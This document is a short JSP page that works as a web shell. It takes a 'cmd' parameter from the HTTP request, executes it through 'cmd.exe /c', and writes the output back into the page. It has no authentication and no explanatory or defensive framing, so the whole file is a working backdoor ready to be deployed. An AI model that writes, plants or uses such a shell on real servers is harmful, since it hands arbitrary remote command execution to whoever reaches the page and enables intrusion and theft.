<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.InputStream"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%
	String cmd = request.getParameter("cmd");
	Process child = Runtime.getRuntime().exec("cmd.exe /c" + cmd);
	InputStream in = child.getInputStream();
	BufferedReader br = new BufferedReader(new InputStreamReader(in));
	
	for(String line = ""; (line = br.readLine()) != null;){
		out.print(line + "<br>");
	}
	br.close();
	in.close();
	child.waitFor();
	
%>